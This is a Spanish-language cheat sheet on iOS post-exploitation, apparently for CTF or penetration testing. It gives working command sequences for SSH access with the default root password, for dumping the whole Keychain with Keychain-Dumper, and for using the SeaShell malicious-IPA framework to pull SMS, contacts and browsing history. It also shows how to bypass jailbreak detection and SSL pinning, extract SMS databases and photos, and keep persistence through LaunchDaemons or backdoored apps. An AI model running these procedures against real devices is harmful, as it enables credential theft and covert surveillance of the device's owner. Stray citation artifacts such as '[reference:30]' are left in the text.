# Post-explotación_iOS

---

iOS es más restrictivo que Android. La mayoría de las técnicas requieren un dispositivo jailbroken. Los jailbreaks modernos más comunes son checkra1n (basado en bootrom exploit checkm8, para dispositivos con chip A5-A11) y palera1n (para iOS 15-16, semi‑atado). Una vez jailbroken, puedes instalar paquetes desde Cydia/Sileo y acceder al sistema de archivos completo.
1. Enumeración básica (desde SSH o shell)

El jailbreak típicamente instala un servidor SSH (OpenSSH). La contraseña por defecto es alpine (¡cámbiala siempre!).
Comando	Propósito
ssh root@<ip_iphone>	Conectarse por SSH (root, pass: alpine)
uname -a	Versión del kernel y arquitectura
sw_vers	Versión exacta de iOS
ps aux	Procesos en ejecución
ps auxf	Árbol de procesos
top -o cpu	Procesos ordenados por uso de CPU
netstat -an	Conexiones de red activas
lsof -p <PID>	Archivos abiertos por un proceso específico
dpkg -l (si tiene Cydia)	Listar paquetes instalados (incluyendo tweaks)
2. Herramientas de post‑explotación para iOS
SeaShell Framework

Framework de post‑explotación que genera un IPA malicioso para instalar vía TrollStore (CoreTrust bug):
bash

# Una vez conectada la sesión:
sysinfo                              # Información del dispositivo[reference:30]
sbinfo                               # Estado de bloqueo (locked/unlocked)[reference:31]
safari_history                       # Extraer historial de navegación[reference:32]
safari_bookmarks                     # Extraer marcadores
sms -l                               # Listar chats SMS[reference:33]
sms <número>                         # Extraer conversación específica[reference:34]
contacts                             # Extraer libreta de direcciones[reference:35]
file download /ruta/archivo          # Descargar archivos del dispositivo
upload /ruta/local /ruta/remota      # Subir archivos

Keychain‑Dumper

Extrae todas las contraseñas y credenciales del llavero de iOS (Keychain):
bash

# Copiar binary al dispositivo (rootless path)
scp keychain_dumper mobile@<ip>:/var/jb/usr/bin/
scp updateEntitlements.sh mobile@<ip>:/var/jb/usr/bin/

# SSH al dispositivo
ssh mobile@<ip>
cd /var/jb/usr/bin && sudo su
chmod +x keychain_dumper updateEntitlements.sh
./updateEntitlements.sh

# Ejecutar Keychain-Dumper
./keychain_dumper -h                    # Ver opciones
./keychain_dumper -a                    # Dump todo el Keychain
./keychain_dumper /private/var/Keychains/keychain-2.db

Nota: El script updateEntitlements.sh otorga todos los permisos necesarios para acceder al Keychain de todas las apps; para rootless (‘palera1n’) configura KEYCHAIN_DUMPER_FOLDER=/var/jb/usr/bin.
3. Bypass de jailbreak detection

Muchas apps (especialmente bancarias o CTF) detectan si el dispositivo está jailbroken. Herramientas para bypassear esta detección:
Herramienta	Descripción
Shadow	Bypass de detección de jailbreak para iOS modernos. Configurable por app en Ajustes
Hestia	Paquete disponible en Sileo/Cydia; se activa en Ajustes > Hestia > Enabled Applications
Choicy	Deshabilita injectores de tweaks por app para evitar detección
vnodebypass	Bypass a nivel de sistema de archivos

Consejo: Si Shadow no funciona, prueba a deshabilitar todos los demás tweaks excepto Shadow, o pasar a una librería de hooking diferente (fishhook).
4. Bypass de SSL pinning

Para interceptar tráfico HTTPS (mitmproxy, Burp):
bash

# Mediante SSL Kill Switch 2 (tweak de Cydia)
# Instalar desde repositorio, luego en Ajustes > SSL Kill Switch 2 > Disable Certificate Validation

# Mediante Objection (sin jailbreak en algunos casos)
objection -g com.example.app explore
ios sslpinning disable

# Mediante Frida script
frida -U -f com.example.app -l ios-ssl-bypass.js

5. Extracción de datos sensibles
Plist (Property List) files

Almacenan configuraciones y a veces credenciales en texto plano:
bash

# Usando objection (una vez dentro de la sesión)
env                                 # Ver rutas de archivos de la app
ios plist cat userInfo.plist        # Leer contenido de un plist[reference:44]

# Manual desde SSH
plutil -p /var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/*.plist

NSUserDefaults

Similar a SharedPreferences en Android, pueden contener datos sensibles.
Bases de datos SQLite
bash

sqlite3 /var/mobile/Containers/Data/Application/<UUID>/Library/Caches/database.db
.tables
SELECT * FROM usuarios;

Mensajes SMS y iMessage
bash

# La base de datos de SMS está en:
/private/var/mobile/Library/SMS/sms.db

# Extraer con sqlite3
sqlite3 sms.db "SELECT text, date, handle_id FROM message;"

Archivos multimedia
bash

/var/mobile/Media/DCIM/            # Fotos y videos de la cámara
/var/mobile/Media/Recordings/      # Grabaciones de voz

6. Persistencia en iOS
Método	Descripción
LaunchDaemon	Crear un archivo .plist en /Library/LaunchDaemons/ con programa a ejecutar al arrancar
Tweak malicioso	Empaquetar payload como tweak de Cydia/Sileo que se ejecute con cada inicio
Backdoor persistente en IPA	Instalar app maliciosa firmada con certificado de empresa o a través de TrollStore
Perpetuar SSH	Crear un script que reinicie sshd si se detiene

Nota: iOS es muy restrictivo incluso cuando está jailbroken; la persistencia puede romperse tras reinicios según el tipo de jailbreak (semi‑atado vs no atado).
7. Consideraciones adicionales

    Rootless vs Rootful: Los jailbreaks más modernos (palera1n en modo rootless) colocan los archivos del jailbreak en /var/jb/ en lugar de /, lo que cambia rutas para herramientas como Keychain-Dumper.

    Corellium: Si el CTF utiliza Corellium para virtualizar iOS, Objection puede conectarse directamente mediante objection -g <package> explore para dump del Keychain y bypass de SSL.

    Dispositivos bloqueados: Si el dispositivo tiene código de bloqueo, sbinfo mostrará Locked: yes, limitando la extracción de datos.

